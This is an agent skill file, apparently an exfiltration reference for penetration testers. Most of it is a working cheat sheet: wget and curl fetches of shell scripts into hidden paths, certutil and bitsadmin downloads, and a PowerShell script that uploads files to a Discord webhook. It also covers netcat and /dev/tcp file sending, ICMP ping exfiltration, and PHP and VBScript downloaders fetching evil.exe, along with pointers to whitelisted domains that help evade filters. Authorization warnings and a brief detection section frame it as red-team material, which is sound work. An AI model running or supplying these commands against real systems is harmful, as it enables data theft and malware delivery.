---
name: security-exfiltration-reference
description: Reference guide for understanding data exfiltration techniques used in authorized security testing, penetration testing, and defensive security research. Use this skill when you need to understand how threat actors exfiltrate data (for detection development), when conducting authorized red team exercises, or when researching TTPs for security assessments. This covers HTTP/HTTPS, webhooks, FTP, SMB, SCP, SSH, Netcat, DNS, ICMP, and other common exfiltration channels. IMPORTANT: Only use these techniques in authorized security testing environments with explicit permission.
---

# Security Exfiltration Reference

> **⚠️ AUTHORIZED USE ONLY**
> This skill contains reference material for understanding data exfiltration techniques. Use only in:
> - Authorized penetration testing engagements
> - Red team exercises with written permission
> - Security research and detection development
> - Educational contexts for defensive security
> 
> **Never use these techniques against systems you don't own or have explicit authorization to test.**

## Purpose

This reference helps security professionals understand exfiltration techniques to:
- Develop detection rules and monitoring
- Conduct authorized red team exercises
- Understand threat actor TTPs (Tactics, Techniques, Procedures)
- Build defensive controls and data loss prevention (DLP) systems

## Commonly Whitelisted Domains

Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused for exfiltration.

## Base64 Encoding

### Linux
```bash
base64 -w0 <file>        # Encode file (no line wrapping)
base64 -d file           # Decode file
```

### Windows
```powershell
certutil -encode payload.dll payload.b64    # Encode
certutil -decode payload.b64 payload.dll    # Decode
```

## HTTP/HTTPS Exfiltration

### Downloading Files (Linux)
```bash
wget 10.10.14.14:8000/file.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/file.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py  # FreeBSD
```

### Downloading Files (Windows)
```powershell
# CertUtil
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64

# BITS Admin
bitsadmin /transfer transfName /priority high http://example.com/file.pdf C:\downloads\file.pdf

# PowerShell WebClient
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe", "C:\Windows\Temp\taskkill.exe")

# Invoke-WebRequest
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"

# BITS Transfer Module
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```

### File Upload Servers

**Python uploadserver module:**
```bash
# Install and run server
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
python3 -m uploadserver --basic-auth hello:world

# Upload a file
curl -X POST http://HOST/upload -F 'files=@file.txt'
# With basic auth:
curl -X POST http://HOST/upload -F 'files=@file.txt' -u hello:world
```

**Simple HTTPS Server (Python 3):**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
```

**Flask HTTPS Server:**
```python
from flask import Flask, request
app = Flask(__name__)

@app.route('/')
def root():
    print(request.get_json())
    return "OK"

if __name__ == "__main__":
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```

## Webhook-Based Exfiltration

Webhooks (Discord, Slack, Teams) are write-only HTTPS endpoints that accept JSON and optional file parts. They're commonly allowed to trusted SaaS domains.

### Discord Webhook Pattern

**Endpoint:** `https://discord.com/api/webhooks/<id>/<token>`

**Key characteristics:**
- POST multipart/form-data
- Part named `payload_json` containing `{"content":"..."}`
- Optional file parts named `file`
- HTTP 204 NoContent/200 OK confirm delivery

**PowerShell Beacon/Exfil Pattern:**
```powershell
$webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$client = [System.Net.Http.HttpClient]::new()

function Send-DiscordText {
    param([string]$Text)
    $payload = @{ content = $Text } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($payload, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] text -> $($resp.StatusCode)"
}

function Send-DiscordFile {
    param([string]$Path, [string]$Name)
    if (-not (Test-Path $Path)) { return }
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $fileContent = New-Object System.Net.Http.ByteArrayContent(,$bytes)
    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
    $json = @{ content = ":package: file exfil: $Name" } | ConvertTo-Json -Compress
    $jsonContent = New-Object System.Net.Http.StringContent($json, [System.Text.Encoding]::UTF8, "application/json")
    $mp = New-Object System.Net.Http.MultipartFormDataContent
    $mp.Add($jsonContent, "payload_json")
    $mp.Add($fileContent, "file", $Name)
    $resp = $client.PostAsync($webhook, $mp).Result
    Write-Host "[Discord] file $Name -> $($resp.StatusCode)"
}
```

**Detection indicators:**
- Outbound HTTPS to discord.com/api/webhooks
- Multipart/form-data POST requests
- Regular beaconing intervals
- File uploads from sensitive directories

## FTP Exfiltration

### FTP Server (Python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```

### FTP Server (Node.js)
```bash
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```

### FTP Client (Windows)
```batch
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET file.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```

## SMB Exfiltration

### SMB Server (Kali Linux)
```bash
# Using impacket
impacket-smbserver -smb2support kali `pwd`
smbserver.py -smb2support name /path/folder

# With authentication
impacket-smbserver -smb2support -user test -password test test `pwd`
```

### SMB Server (Samba)
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb

# Add to /etc/samba/smb.conf:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes

service smbd restart
```

### SMB Client (Windows)
```powershell
# CMD
net use z: \\10.10.14.14\test /user:test test

# PowerShell
New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
cd new_disk:
```

## SCP Exfiltration

Requires SSH daemon running on target:
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```

## SSHFS Mount

Mount remote directory locally:
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <username>@<IP>:<path>/ /mnt/sshfs/
```

## Netcat (nc) Exfiltration

### File Transfer
```bash
# Attacker (receive)
nc -lvnp 4444 > new_file

# Victim (send)
nc -vn <IP> 4444 < exfil_file
```

### /dev/tcp Method (Bash)

**Download from victim:**
```bash
# Attacker
nc -lvnp 80 > file

# Victim
cat /path/file > /dev/tcp/10.10.10.10/80
```

**Upload to victim:**
```bash
# Attacker
nc -w5 -lvnp 80 < file_to_send.txt

# Victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```

## ICMP Exfiltration

**Send data via ping:**
```bash
xxd -p -c 4 /path/file | while read line; do ping -c 1 -p $line <IP>; done
```

**Receive ICMP data (Python/Scapy):**
```python
from scapy.all import *

def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:]
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```

## SMTP Exfiltration

**Debug SMTP server:**
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```

## TFTP Exfiltration

**TFTP Server (Python):**
```bash
pip install ptftpd
ptftpd -p 69 tap0 .
```

**TFTP Client:**
```bash
tftp -i <SERVER-IP> get filename
```

## PHP File Download

```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```

## VBScript Download

**Create wget.vbs:**
```vbs
strUrl = WScript.Arguments.Item(0)
StrFile = WScript.Arguments.Item(1)
Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0
Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0
Const HTTPREQUEST_PROXYSETTING_DIRECT = 1
Const HTTPREQUEST_PROXYSETTING_PROXY = 2
Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts
Err.Clear
Set http = Nothing
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
http.Open "GET", strURL, False
http.Send
varByteArray = http.ResponseBody
Set http = Nothing
Set fs = CreateObject("Scripting.FileSystemObject")
Set ts = fs.CreateTextFile(StrFile, True)
strData = ""
strBuffer = ""
For lngCounter = 0 to UBound(varByteArray)
    ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1)))
Next
ts.Close
```

**Execute:**
```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```

## Debug.exe Binary Reconstruction

`debug.exe` can rebuild binaries from hex (limited to 64KB):
```bash
# Compress binary
upx -9 nc.exe

# Convert to hex (requires exe2bat.exe)
wine exe2bat.exe nc.exe nc.txt
```

Then paste the hex content into Windows command prompt with debug.exe.

## DNS Exfiltration

See: [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)

## Detection and Defense Considerations

### Network Monitoring
- Monitor outbound connections to unusual ports/domains
- Alert on large data transfers to external IPs
- Track beaconing patterns (regular intervals)
- Monitor for encoded data in DNS queries

### Endpoint Detection
- Monitor process creation for exfiltration tools (nc, curl, wget, certutil)
- Alert on PowerShell making HTTP requests
- Track file access in sensitive directories
- Monitor for new network connections from unusual processes

### Data Loss Prevention
- Implement DLP solutions
- Restrict outbound traffic to known-good destinations
- Use SSL inspection for encrypted traffic analysis
- Monitor cloud storage and webhook usage

## References

- [Discord as a C2 and the cached evidence left behind](https://www.pentestpartners.com/security-blog/discord-as-a-c2-and-the-cached-evidence-left-behind/)
- [Discord Webhooks API](https://discord.com/developers/docs/resources/webhook#execute-webhook)
- [Discord Forensic Suite](https://github.com/jwdfir/discord_cache_parser)
- [Lots Project - Whitelisted Domains](https://lots-project.com/)
- [DNS Exfiltration Tool](https://github.com/Stratiz/DNS-Exfil)
